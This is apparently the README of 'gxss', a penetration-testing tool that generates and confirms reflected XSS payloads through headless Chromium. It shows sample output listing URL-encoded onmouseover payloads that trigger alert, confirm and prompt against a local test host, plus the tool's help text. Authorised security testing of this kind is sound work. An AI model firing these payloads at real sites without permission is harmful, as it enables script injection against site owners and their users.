# gxss
Generate and test XSS payloads given injection points  
DOM is evaluated by chromium, and payloads that pop `alert`, `prompt`, or `confirm` are confirmed  
  
Example Input (JSON or YAML structs separated by newline):
```
{"URL":"http://192.168.1.108:9999/home","Keys":["q"]}
```
Example Output:
```
$ echo http://192.168.1.108:9999/home | url-miner -w ../url-miner/testwords -json | gxss -s -i
[low] http://192.168.1.108:9999/home?q=%27zzxqyj%3D%27
[medium] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27zzxqyj
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28%29
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28%29
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28x%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%28x%29
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%60%60
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%60%60
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%601%60
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27confirm%601%60
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28x%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%28x%29
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%281%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27alert%281%29
[high] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27prompt%28%29
[confirmed] http://192.168.1.108:9999/home?q=%27onmouseover%3D%27prompt%28%29
...
...
```

# Help
```
$ gxss -h
Usage of gxss:
  -debug
    	Display errors.
  -debug-chrome
    	Don't use headless. (slow but fun to watch)
  -i	Try to perform handler to trigger payload.
  -p string
    	YAML file of escape patterns and xss payloads. (default "./payloads.yaml")
  -proxy string
    	Proxy URL. Example: -proxy http://127.0.0.1:8080
  -s	Show result type.
  -sev int
    	Filter by severity. 1 is a confirmed alert, 2-4 are high-low. (default 4)
  -stop
    	Stop on first confirmed xss.
  -t int
    	Number of threads to use. (default 8)
  -wait int
    	Seconds to wait on page after loading in chrome mode. (Use to wait for AJAX reqs)
```
